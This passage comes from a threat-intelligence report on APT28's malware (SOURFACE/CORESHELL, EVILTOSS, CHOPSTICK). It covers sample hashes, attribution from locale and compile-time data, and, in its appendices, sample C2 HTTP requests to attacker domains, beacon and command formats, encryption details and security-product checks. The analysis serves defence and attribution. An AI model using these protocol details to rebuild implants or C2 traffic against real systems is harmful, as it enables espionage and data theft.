ECOSYSTEM?\n\nFirst, a malware family is a collection of malware in which each sample shares a significant\namount of code with all of the others. There are exceptions: for example, some files\ncontain public and standard code libraries that we do not take into consideration\nwhen making a family determination.\n\nA malware ecosystem is a group of malware families that work together to perform\nthe same objective. Perhaps the simplest and most typical ecosystem\nis a dropper and a backdoor that are used together. They may not share the\nsame code structure, but they are related because one drops and installs\nthe other.\n\nThe ecosystem surrounding the SOURFACE downloader frequently\nconsists of a dropper, which installs SOURFACE. The SOURFACE\ndownloader then receives another dropper from its C2 server, and\nthis second dropper installs a second stage backdoor, which is\nusually EVILTOSS.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nIn April 2013, based on compile time, the group\nbegan to make significant alterations to the **Figure 7: Example of modified SOURFACE vs. CORESHELL communications**\nSOURFACE downloader. They started by\nchanging the compiled DLL name to “coreshell.dll”\nand making minor changes to the network\ncommunications, as seen in Figure 7. SOURFACE URL for a sample compiled April 2013:\n\nhttp://[hostname]/~book/cgi-bin/brvc.cgi?WINXPSP3c95b87a4-05_01\n\nThe hostname, volume serial number and OS\nversion data are encoded in the new URL format. CORESHELL URL for a sample compiled April 2013:\nAs seen in the table below, the SOURFACE/ http://[hostname]/~xh/ch.cgi?enhkZm1GNmY1YWg0eGcxMGQ1MDUwMQ==\nCORESHELL developers also made other\nmodifications that changed the exported function\nname and file size over time.\n\n**Table 4: Evolution of SOURFACE downloader over time**\n\n###### MD5 Size Compile Date Export Name Notes\n\n272f0fde35dbdfccbca1e33373b3570d 11264 2013-04-16 10:49:25 UTC Init1 17\n\n8b92fe86c5b7a9e34f433a6fbac8bc3a 14848 2013-08-06 07:53:03 UTC Initialize 18\n\n9eebfebe3987fec3c395594dc57a0c4c 12800 2013-08-14 10:48:59 UTC Initialize 19\n\nda2a657dc69d7320f2ffc87013f257ad 12800 2013-08-21 07:52:10 UTC Initialize Same as previous.\n\n1259c4fe5efd9bf07fc4c78466f2dd09 12800 2013-10-03 09:21:10 UTC Initialize Same as previous.\n\n3b0ecd011500f61237c205834db0e13a 43520 2014-02-13 16:29:36 UTC Applicate 20\n\n5882fda97fdf78b47081cc4105d44f7c 45056 2014-05-13 15:18:24 UTC Applicate 21\n\n791428601ad12b9230b9ace4f2138713 45056 2014-05-13 16:42:26 UTC Applicate Same as previous.\n\nead4ec18ebce6890d20757bb9f5285b1 45056 2014-07-25 15:44:04 UTC Applicate Same as previous.\n\n48656a93f9ba39410763a2196aabc67f 112640 2014-07-30 11:13:24 UTC Applicate 22\n\n8c4fa713c5e2b009114adda758adc445 112640 2014-07-30 11:13:24 UTC Applicate Same as previous.\n\n17 SOURFACE with minor changes to network communications (see Figure 7).\n\n18 Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent).\n\n19 Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\\chkdbg.log.\n\n20 Statically links msvcrt library.\n\n21 Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use.\n\n22This version added assembly level obfuscation, which slows down analysis. This variant requires the OS to be at least Windows Vista.\n\n|MD5|Size|Compile Date|Export Name|Notes|\n|---|---|---|---|---|\n|272f0fde35dbdfccbca1e33373b3570d|11264|2013-04-16 10:49:25 UTC|Init1|17|\n|8b92fe86c5b7a9e34f433a6fbac8bc3a|14848|2013-08-06 07:53:03 UTC|Initialize|18|\n|9eebfebe3987fec3c395594dc57a0c4c|12800|2013-08-14 10:48:59 UTC|Initialize|19|\n|da2a657dc69d7320f2ffc87013f257ad|12800|2013-08-21 07:52:10 UTC|Initialize|Same as previous.|\n|1259c4fe5efd9bf07fc4c78466f2dd09|12800|2013-10-03 09:21:10 UTC|Initialize|Same as previous.|\n|3b0ecd011500f61237c205834db0e13a|43520|2014-02-13 16:29:36 UTC|Applicate|20|\n|5882fda97fdf78b47081cc4105d44f7c|45056|2014-05-13 15:18:24 UTC|Applicate|21|\n|791428601ad12b9230b9ace4f2138713|45056|2014-05-13 16:42:26 UTC|Applicate|Same as previous.|\n|ead4ec18ebce6890d20757bb9f5285b1|45056|2014-07-25 15:44:04 UTC|Applicate|Same as previous.|\n|48656a93f9ba39410763a2196aabc67f|112640|2014-07-30 11:13:24 UTC|Applicate|22|\n|8c4fa713c5e2b009114adda758adc445|112640|2014-07-30 11:13:24 UTC|Applicate|Same as previous.|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader.\n\n\n**Figure 8: NATO-themed decoy**\ndelivered with possible EVILTOSS\npredecessor from 2004\n\n\nVariants of the SOURFACE second stage\nbackdoor, EVILTOSS, share some code similarities\nwith SOURFACE. However, it contains more\ncapabilities, including the ability to provide access\nto the file system and registry, enumerate network\nresources, create processes, log keystrokes, access\nstored credentials, and execute shellcode. The\nbackdoor encrypts data that it uploads with an RSA\npublic key. Many of its variants we have seen are\nnamed netui.dll. EVILTOSS variants may use the\nSimple Mail Transfer Protocol (SMTP) to send\nstolen data in an attachment named “detaluri.\ndat”. The backdoor attaches this file to a\npreformatted email and sends it out through a\nvictim’s mail server.\n\n\nInterestingly, we found an antivirus report from\n2004[23] detailing what appears to be an early\nvariant of EVILTOSS. The backdoor was installed\nalongside the NATO-themed decoy document\ndepicted in Figure 8. The backdoor sent data via\nSMTP to nato_smtp@mail[.]ru and received its\ntasking via POP from nato_pop@mail[.]ru.\nAlthough we have not conclusively attributed\nthis sample to APT28, it does suggest the\npossibility that APT28 has been operating since\nas early as 2004.[24]\n\n\n23 http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99\n\n24 Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on\n\nthese factors alone. We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004. APT28 could have possibly obtained\nthis source code from another group of actors. Also, malware can be passed from group to group. The other malware that we associate with APT28 in this\npaper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### MODULAR IMPLANTS INDICATE A FORMAL DEVELOPMENT ENVIRONMENT\n\n A modular development framework suggests the group has had an organized development effort since as early as 2007.\n\nuring our research, we discovered that\nAPT28 uses a backdoor developed using a\nmodular framework. We call this\n\n#### D\n\nbackdoor CHOPSTICK, a somewhat ironic name\nthat comes from our semi-random name\ngenerator. The modular design allows flexible\noptions for compiling variants with different\ncapabilities as needed, as well as deploying\nadditional capabilities at runtime. This allows the\ndevelopers to make targeted implants, including\nonly the capabilities and protocols necessary for a\nspecific environment. Such a modular framework\nsuggests the group has had an organized\ndevelopment effort since as early as 2007. A\nformal development environment, in which code is\nversioned and well-organized, would almost\ncertainly be required to track and define the\nvarious modules that can be included in the\nbackdoor at compile time.\n\n\nCHOPSTICK variants may move messages and\ninformation using at least three methods:\n\n1. **Communications with a C2 server using**\n**HTTP. These protocols are covered in more**\ndetail in Appendix D.\n2. **Email sent through a specified mail server.**\nOne CHOPSTICK v1 variant contained\nmodules and functions for collecting\nkeystroke logs, Microsoft Office documents,\nand PGP files. The monitoring for new files of\ninterest is performed by a “Directory\nObserver” module. In one sample this\ninformation was intended to be sent via\nSMTP using a Georgian MIA mail server. It\nused one of four embedded sender email\naddresses (@mia.gov.ge) to send files via\nemail to another email address on the same\nmail server. All information required for the\nemail was hardcoded in the backdoor.\n3. **Local copying to defeat closed networks.**\nOne variant of CHOPSTICK focuses on\napparent air gap / closed network capabilities\nby routing messages between local\ndirectories, the registry and USB drives.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APT28 MALWARE INDICATES RUSSIAN SPEAKERS IN A RUSSIAN TIME ZONE\n\nuring our research into APT28’s malware,\nwe noted two details consistent across\nmalware samples. The first was that\n\n#### D\n\nAPT28 had consistently compiled Russian language\nsettings into their malware. The second was that\nmalware compile times from 2007 to 2014\ncorresponded to normal business hours in the UTC\n+ 4 time zone, which includes major Russian cities\nsuch as Moscow and St. Petersburg.\n\n###### Use of Russian and English Language Settings in PE Resources\nPE resources include language information that\ncan be helpful if a developer wants to show user\n\n**Table 5: Locale and language identifiers associated with APT28 malware**\n\n\ninterface items in a specific language.[25] Non-default\nlanguage settings packaged with PE resources are\ndependent on the developer’s build environment.\nEach PE resource includes a “locale” identifier with\na language ID “composed of a primary language\nidentifier indicating the language and a sublanguage\nidentifier indicating the country/region.”[26 ]\n\nAt the time of the writing of this paper, we had\nidentified 103 malware samples that were both\nattributed to APT28 and contained PE resources.\nTable 5 shows the locale identifiers[27] with\nassociated language and country/region for\nthese samples.\n\n|Locale ID|Primary language|Country/Region|Number of APT28 samples|\n|---|---|---|---|\n|0x0419|Russian (ru)|Russia (RU)|59|\n|0x0409|English (en)|United States (US)|27|\n|0x0000 or 0x0800|Neutral locale / System default locale language|Neutral|16|\n|0x0809|English (en)|United Kingdom (GB)|1|\n\n\n25Microsoft Developer Network – Multiple Language Resources http://msdn.microsoft.com/en-us/library/cc194810.aspx\n\n26, 27 Microsoft Developer Network – Language Identifier Constants and Strings http://msdn.microsoft.com/en-us/library/dd318693.aspx\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nThe samples with Russian language settings were\ncompiled between late 2007 and late 2013, as\ndepicted in Figure 9. This consistency over a\nlong timeframe suggests that the developers of\nAPT28 malware were using a build environment\n\n**Figure 9: Number of APT28 samples with Russian language settings by compile month**\n\n\nwith Russian language settings at least some of\nthe time and made no effort to obscure this\ndetail. Overall, the locale IDs suggest that\nAPT28 developers can operate in both Russian\nand English.\n\n|2007 December 2008 March May August 2009 February May September 2010 February March August September October November December 2011 April June September December 2012 April May June July October December 2013 January July August October November December|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|\n|---|---|---|---|---|---|---|---|---|---|---|\n\n\n###### 0  1  2  3  4  5  6  7  8  9\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### Compile Times Align with Working Hours in Moscow and St. Petersburg\nOf the 140 malware samples that we have\nattributed to APT28 so far, over 89% were\ncompiled between 0400 and 1400 UTC time, as\ndepicted in Figure 10. Over 96% were compiled\nbetween Monday and Friday. This parallels the\nworking hours in UTC+0400 (that is, compile\ntimes begin about 8AM and end about 6PM in this\ntime zone). This time zone includes major Russian\ncities such as Moscow and St. Petersburg.\n\n13:00 14:00 15:00 16:00\n\n**Figure 10: Compile Times of APT28 malware in UTC Time**\n\n20\n\n18\n\n**Moscow business hours**\n\n16\n\n14\n\n12\n\n10\n\n8\n\n6\n\n4\n\n2\n\n**0   1** **2    3** **4    5    6    7    8    9    10   11   12   13   14   15   16   17   18   19   20   21   22   23   24**\n\n###### TIME OF DAY (UTC)\n\n|Col1|Col2|Col3|Col4|\n|---|---|---|---|\n|13:00|14:00|15:00|16:00|\n\n|20|Col2|Col3|Col4|\n|---|---|---|---|\n|18||||\n|16|||Moscow business hours|\n|14||||\n|12||||\n|10||||\n|||||\n|8 6||||\n|||||\n|4||||\n|||||\n|2||||\n|||||\n|||||\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### CONCLUSION\n\nWe started researching APT28 based on activity\nwe observed on our clients’ networks, similar to\nother targeted threat groups we have identified\nover time. We assess that APT28 is most likely\nsponsored by the Russian government. We\nsummarize our key observations about APT28 in\nFigure 11 below.\n\n**Figure 11: Summary of key observations about APT28**\n\n\nAPT28’s characteristics—their targeting, malware,\nlanguage, and working hours—have led us to\nconclude that we are tracking a focused, longstanding espionage effort. Given the available\ndata, we assess that APT28’s work is sponsored\nby the Russian government.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APPENDIX A: DISTINGUISHING THREAT GROUPS\n\nWe use the term “threat group” to refer to actors\nwho work together to target and penetrate\nnetworks of interest. These individuals may share\nthe same set of tasks, coordinate targets, and\nshare tools and methodology. They work together\nto gain access to their targets and steal data.\n\nThe art of attributing disparate intrusion activities\nto the same threat group is not always simple.\nDifferent groups may use similar intrusion\nmethodologies and common tools, particularly\nthose that are widely available on the Internet,\nsuch as pwdump, HTran, or Gh0st RAT. There may\nbe overlaps between groups caused by the sharing\nof malware or exploits they have authored, or\neven the sharing of personnel. Individual threat\nactors may move between groups either\ntemporarily or permanently. A threat actor may\nalso be a private citizen who is hired by multiple\ngroups. Multiple groups, on occasion, compromise\nthe same target within the same timeframe.\n\nDistinguishing one threat group from another is\npossible with enough information, analytical\nexperience, and tools to piece it all together. We\ncan analyze multiple incidents and tell by the\nevidence left behind that a given incident was the\nresult of one threat group and not another.\n\n\nThreat actors leave behind various forensic\ndetails. They may send spear phishing emails from\na specific IP address or email address. Their emails\nmay contain certain patterns; files have specific\nnames, MD5 hashes, timestamps, custom\nfunctions, and encryption algorithms. Their\nbackdoors may have command and control IP\naddresses or domain names embedded. These are\njust a few examples of the myriad of forensic\ndetails that we consider when distinguishing one\nthreat group from another.\n\nAt the most basic level, we say that two intrusion\nevents are attributed to the same group when we\nhave collected enough indicators to show beyond\na reasonable doubt that the same actor or group\nof actors were involved. We track all of the\nindicators and significant linkages associated with\nidentified threat groups in a proprietary database\nthat comprises millions of nodes and linkages\nbetween them. In this way, we can always go back\nand answer “why” we associated cyber threat\nactivity with a particular group.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APPENDIX B: TIMELINE OF APT28 LURES\n\n|YEAR|LURE TOPIC|MALWARE|\n|---|---|---|\n|2010 2011 2011 2011 2012 2012 2012 2012 2012 2012 2013 2013 2013 2013 2013 2013 2013 2014 2014|Iran’s work with an international organization (internal document) File named “military cooperation.doc” Georgian language IT document for Ministry of Internal Affairs (internal document) “USB Disk Security is the best software to block threats that can damage your PC or compromise your personal information via USB storage.” Food security in Africa (“Food and nutrition crisis reaches peak but good forecast for 2013”) “IDF Soldier Killed and another injured in a Terror Attack” “Echo Crisis Report” on Portugal’s forest fires “FBI to monitor Facebook, Twitter, Myspace” Georgia (US state, not the country of Georgia) murder case uncovers terror plot Military attaches in London (internal document) South Africa MFA document John Shalikashvili (Georgian-Polish-American US General) Questionnaire Asia Pacific Economic Cooperation Summit 2013 reporters (internal document) Defense Attaches in Turkey (internal document) Turkish Cypriot news about Syria chemical weapons Georgian language document about drivers’ licenses (internal document) Apparent Reason Magazine-related lure sent to a journalist Mandarin language document, possibly related to a Chinese aviation group (non-public document) Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack|SOURFACE SOURFACE, OLDBAIT SOURFACE SOURFACE SOURFACE SOURFACE SOURFACE SOURFACE SOURFACE SOURFACE CHOPSTICK, CORESHELL CORESHELL SOURFACE CHOPSTICK, CORESHELL CHOPSTICK, CORESHELL EVILTOSS CORESHELL CORESHELL CORESHELL|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APPENDIX C:\n SOURFACE/CORESHELL\n\nSOURFACE is a downloader that obtains a second\nstage backdoor from a C2 server. Over time the\ndownloader has evolved and the newer versions,\nusually compiled with the DLL name ‘coreshell.dll’,\nare distinct enough from the older versions that\nwe refer to it as SOURFACE/CORESHELL or\nsimply CORESHELL. This appendix focuses on\nthese newer versions.\n\nCORESHELL uses two threads to communicate\nwith its C2 server. The first thread sends beacons\nthat contain the process listing of the\ncompromised host. The second thread is\nresponsible for downloading and executing stage\n\n\ntwo payloads. Messages are sent using HTTP\nPOST requests whose bodies contain encrypted\nand Base64 encoded data. The encryption\nalgorithm is a custom stream cipher using a\nsix-byte key. Commands from the controller to the\nCORESHELL implant are encrypted using another\nstream cipher but this time using an eight-byte\nkey. CORESHELL has used the same user agent\nstring (“MSIE 8.0”) that SOURFACE previously\nused, but in more recent samples CORESHELL\nuses the default Internet Explorer user agent\nstring obtained from the system. Figure 11 shows\nan example POST request.\n\n\n**Figure 11: Example CORESHELL POST request**\n\nPOST /check/ HTTP/1.1\n\nUser-Agent: MSIE 8.0\n\nHost: adawareblock.com\n\nContent-Length: 58\n\nCache-Control: no-cache\n\nzXeuYq+sq2m1a5HcqyC5Zd6yrC2WNYL989WCHse9qO6c7powrOUh5KY=\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nWhen Base64 decoded, the POST content looks like this:\n\n00000000 cd 77 ae 62 af ac ab 69 b5 6b 91 dc ab 20 b9 65 .w.b...i.k... .e\n00000010 de b2 ac 2d 96 35 82 fd f3 d5 82 1e c7 bd a8 ee ...-.5..........\n00000020 9c ee 9a 30 ac e5 21 e4 a6 ...0..!..\n\nThe key used to encrypt the message is six bytes long and is appended to the end of the message. In this is\nexample the key would be: 30 ac e5 21 e4 a6. When the message is decrypted, the resulting plaintext is:\n\n00000000 00 72 68 64 6e 7a 78 64 66 6d 46 36 66 35 61 68 .rhdnzxdfmF6f5ah\n00000010 34 78 67 30 34 30 33 30 35 30 31 1a 00 00 00 23 4xg04030501....#\n00000020 00 00 00 ...\n\nThe following table contains a breakdown of each of the field’s C2 message.\n\n**Table 6: Example CORESHELL beacon structure**\n\n|Offset|Value|Description|\n|---|---|---|\n|00|00|Command byte: 0 - Command request 1 - Process listing|\n|01|“rhdn”|Unknown - Potentially a campaign identifier. Values seen so far: “rhze”, “rhdn” and “mtfs”.|\n|05|“zxdfmF6f5ah4xg”|Hostname of compromised system|\n|13|“0403”|Unknown - Potentially a version number. This number is hardcoded within the implant.|\n|17|“05”|OS Major version|\n|19|“01”|OS Minor version|\n|1B|0x0000001a|Header length minus the command byte (LE DWORD)|\n|1F|0x00000023|Length of the entire message (LE DWORD)|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nCommands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST\nrequests. The command is identified by the NULL terminated UNICODE string “OK” (O\\x00\\K\\x00\\x00\\\nx00). The command is Base64 encoded and immediately follows the “OK” string. Figure 12 shows a\nsample CORESHELL command:\n\n\n**Figure 12: Example CORESHELL controller response**\n\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 58\n\nO.K...AQAAAKqqAQEBAQEBAQEVzPMEUUIzQtND8kOSRLVEVUV0RRRGN0bX\n\n\nThe Base64 decoded string is:\n\n00000000 01 00 00 00 AA AA 01 01 01 01 01 01 01 01 10 41 ........ .......A\n00000010 70 41 10 42 33 42 D3 43 F2 43 92 44 B5 44 55 45 pA.B3B.C .C.D.DUE\n00000020 74 45 14 46 37 46 D7 tE.F7F.\n\nThe following table contains a description of each field in the command message:\n\n**Table 7:** CORESHELL C2 message structure\n\n|Offset|Value|Description|\n|---|---|---|\n|00|0x00000001|Constant value, must be set to 1 (LE DWORD)|\n|04|AA AA|Unknown - not referenced|\n|06|01 01 01 01 01 01 01 01|Encryption key (8 bytes)|\n|0E|10 41 70 41 10 42 33...|Encrypted command|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nWhen the above command “10 41 70 41 10 42 33…” is decrypted using the key “01 01 01 01 01\n01 01 01” the following command message is produced:\n\n00000000 04 CC C2 04 00 42 42 42 42 43 43 43 43 44 44 44 .....BBBBCCCCDDD\n00000010 44 45 45 45 45 46 46 46 46           DEEEEFFFF\n\nThe implant supports the following four command identifiers from the controller as seen in Table 8. The\nfirst byte of the command message specifies the command type and is immediately followed by the PE or\nshellcode to be executed. In this example the command byte is 04 indicating the following bytes are\nshellcode. If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would\nbe written to disk and executed.\n\n**Table 8:** CORESHELL commands\n\n|Command ID|Description|\n|---|---|\n|01|Save command data as %LOCALAPPDATA%\\svchost.exe and execute using CreateProcess.|\n|02|Save command data as %LOCALAPPDATA%\\conhost.dll and execute using “rundll32.exe \\”%s\\”,#1”.|\n|03|Save command data as %LOCALAPPDATA%\\conhost.dll and execute using LoadLibrary.|\n|04|Command data is a shell code and is executed using CreateThread.|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### APPENDIX D:\n CHOPSTICK\n\nCHOPSTICK is a backdoor that uses a modularized, object-oriented framework written in C++. This\nframework allows for a diverse set of capabilities across malware variants sharing a common code base.\nCHOPSTICK may communicate with external servers using SMTP or HTTP. This appendix documents\nvariants using HTTP communications.\n\nThe first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key\n\nHKU\\S-1-5-19_Classes\\Software\\Microsoft\\MediaPlayer\\{E6696105-E63E-4EF1-939E15DDD83B669A}\\chnnl. The user HKU\\S-1-5-19 corresponds to the LOCAL_SERVICE account SID.\nThe configuration block is encrypted using RC4 encryption. The key is a combination of a 50-byte static\nkey and a four-byte salt value randomly generated at runtime. The static key is derived from opcodes in\nthe backdoor.\n\nCHOPSTICK collects detailed information from the host including the Windows version, CPU\narchitecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows\nVista and above and Internet Explorer settings. It also tests for the installation of specific security\nproducts (Table 9) and applications (Table 10).\n\n**Table 9:** Endpoint security products detected by CHOPSTICK\n\n|Service Name|Security Product|\n|---|---|\n|Acssrv|Agnitum Client Security|\n|AVP|Kaspersky|\n|SepMasterService|Symantec|\n|McAfeeService|McAfee|\n|AntiVirService|Avira|\n|Ekrn|ESET|\n|DrWebAVService|Dr. Web Enterprise Security|\n|MBAMService|Malwarebytes Anti-Malware|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n**Table 10:** Applications detected by CHOPSTICK\n\n|Process Name|Application|\n|---|---|\n|firefox.exe|Mozilla Firefox|\n|iexplore.exe|Internet Explorer|\n|outlook.exe|Microsoft Outlook|\n|opera.exe|Opera Browser|\n|bat.exe|Unknown|\n|msimn.exe|Outlook Express|\n|vpngui.exe|Cisco Anyconnect VPN client|\n|ipseca.exe|IPsec VPN client|\n|ipsecc.exe|IPsec VPN client|\n|openvpn.exe|OpenVPN client|\n|openssl.exe|OpenSSL|\n|openvpn-gui-1.0.3.exe|OpenVPN client|\n|msmsgs.exe|Microsoft Messenger|\n|wuauclt.exe|Windows Update|\n|chrome.exe|Google Chrome Browser|\n|thebat.exe|The Bat Secure Email Client|\n|skype.exe|Skype Messenger|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nAfter collecting host information, CHOPSTICK creates a hidden file that may be named\n%ALLUSERSPROFILE%\\edg6EF885E2.tmp for temporary storage and creates a Windows mailslot with the\nname “check_mes_v5555”.[28] Its usage of a Windows mailslot would potentially allow external binaries to\nwrite data to the “check_mes_v5555” mailslot, possibly allowing CHOPSTICK to encrypt and store\noutput from other malware. It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.). User activity is captured once every 500 milliseconds and logged in\nan HTML-like format. The thread writes user activity log messages to the “check_mes_v5555” mailslot in\nplain text. CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the\nencrypted message in an edg6EF885E2.tmp temporary file. The RC4 encryption used here also uses a 50byte static key plus four-byte random salt value.\n\nAfter approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2\nservers over HTTP. After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2.\ntmp to the C2 server using HTTP POST requests. It does not wait for a response from the server to begin\nuploading. Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file. Figure 13\nbelow contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp.\n\n\n**Figure 13: Sample CHOPSTICK v2 HTTP POST**\n\nPOST /search/?btnG=D-3U5vY&utm=79iNI&ai=NPVUnAZf8FneZ2e_qptjzwH1Q&PG3pt=nB9onK2KCi HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101\nFirefox/20.0\nHost: windows-updater.com\nContent-Length: 77\nCache-Control: no-cache\n\n1b2x7F4Rsi8_e4N_sYYpu1m7AJcgN6BzDpQYv1P2piFBLBqghXiHY3SIfe8cUHHYojeXfeyyOhw==\n\n\n28A mailslot is a Windows inter-process communication (IPC) mechanism similar to a named pipe, but is designed for one-way communications between\n\nprocesses and can also be used across the network.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nCHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes “+” and “/” for “-” and\n“_”, respectively. Each HTTP request contains multiple Base64 encoded URL parameters, however only\none parameter contains information encoded by the malware (“ai=”) and the rest of the URL parameters\nappear to be randomly generated per request.\n\nCHOPSTICK encrypts an 11-byte sequence in the “ai=” parameter. The purpose of this parameter\nappears to be to uniquely identify the particular instance of the backdoor to the C2 server. The Base64\nencoded text of this parameter begins with a number of randomly generated alphabetical characters\npresumably intended to prevent people from Base64 decoding the whole string without some knowledge\nof how the malware family works. The first four bytes of the message are an XOR key for the remainder of\nthe data. Once decrypted using the XOR key, an 11-byte sequence is revealed. The first seven bytes are\nstatic, and are hard-coded in CHOPSTICK, while the last four bytes appear to be unique.\n\nThe message body of the POST request is also Base64 encoded. This encoded string is also prefixed with\nrandom characters designed to break the output of a Base64 decode operation on the entire string. The\nfirst 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence\nstored in the “ai=” parameter as described above. Decrypting these bytes yields another static seven-byte\nsequence, followed by four unique bytes. The remainder of the message body consists of the RC4\nencrypted data containing the HTML-formatted user activity log, edg6EF885E2.tmp.\n\nAfter uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using\nHTTP GET requests. The malware contains code which allows it to load or memory-map external modules\nthat export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp,\nIsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage,\nand TakeMessage.\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\n###### Modularity\nCHOPSTICK backdoors are compiled within a modularized development framework. This means that\ntwo separate CHOPSTICK backdoors may contain vastly different functionality, depending on which\nmodules were included at compile time. The modules that are included in an instance of CHOPSTICK\nmay be reported to the C2 server as part of POST messages. Figure 14 includes an example from a\nCHOPSTICK v1 variant:\n\n\n**Figure 14: Sample CHOPSTICK v1 HTTP POST including module identification**\n\nPOST /webhp?rel=psy&hl=7&ai=d2SSzFKlR4l0dRd_ZdyiwE17aTzOPeP-PVsYh1lVAXpLhIebB4=\nHTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101\nFirefox/20.0\nHost: adobeincorp.com\nContent-Length: 71\nCache-Control: no-cache\n\nd2SSzFKchH9IvjcM55eQCTbMbVAU7mR0IK6pNOrbFoF7Br0Pi__0u3Sf1Oh30_HufqHiDU=\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nTo decode the POST content, the first step is to remove characters from the Base64 string (the number of\ncharacters to remove may vary between different communication channels). In the example from Figure\n14, the number of characters removed is seven. Once these characters are removed the decoded (but\nstill encrypted) text looks like this:\n\n00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..”..3.^@$.1.@S\n00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/\n00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5\n\nThe first two words (“72 11” and “fd 22”) are checksums that are used to validate the message. The next 4\nbytes “f8 dc 33 9e” are a salt value that is appended to the end of an RC4 key. Once decrypted, the\nmessage looks like the following:\n\n00000000 72 11 fd 22 f8 dc 33 9e 56 34 4d 47 4e 78 5a 57 r..”..3.V4MGNxZW\n00000010 6c 76 63 6d 68 6a 4f 47 39 79 5a 51 3d 3c 3c ee lvcmhjOG9yZQ=<<.\n00000020 01 00 00 01 00 23 01 10 23 01 11 23 01 13 23 .....#..#..#..#\n\nThe strings “V4MGNxZWlvcmhjOG9yZQ” and “=<<\\xee” are hardcoded in the implant. The module\ninformation starts at offset 0x20 with the string “01 00 00” and is formatted as follows:\n\n**Table 11:** Example CHOPSTICK v1 message format\n\n|Offset|Value|Description|\n|---|---|---|\n|00|0x0001|Message from the AgentKernel v1|\n|02|00|Command ID|\n|03|01 00 23 01 10 23 01 11 23 01 13 23|List of modules included in the implant separated by a ‘#’ character|\n\n\n-----\n\n**APT 28: A Window into Russia’s Cyber Espionage Operations?**\n\nThe modules included in this CHOPSTICK v1 implant are:\n\n**Table 12:** Example CHOPSTICK v1 module list\n\n**Module ID** **Internal Module Name** **Description**\n\n0x0001 AgentKernel Kernel, probably version 1. Handles communication between modules and C2\ntunnels.\n\n0x1001 modKey Logs keystrokes and takes screen captures.\n\n0x1101 modFS Facilitates file system access, such as directory browsing along with reading,\ndeleting and opening files.\n\n0x1301 modProcRet Remote command shell access.\n\nOur determination of a CHOPSTICK “v1” versus “v2” is based on the self-identification of the kernel ID\nand associated modules. Compare the list of CHOPSTICK v1 modules in Table 12 with the list of modules\nin an example CHOPSTICK v2 variant in Table 13:\n\n**Table 13:** Example CHOPSTICK v2 module list\n\n|Module ID|Internal Module Name|Description|\n|---|---|---|\n|0x0001|AgentKernel|Kernel, probably version 1. Handles communication between modules and C2 tunnels.|\n|0x1001|modKey|Logs keystrokes and takes screen captures.|\n|0x1101|modFS|Facilitates file system access, such as directory browsing along with reading, deleting and opening 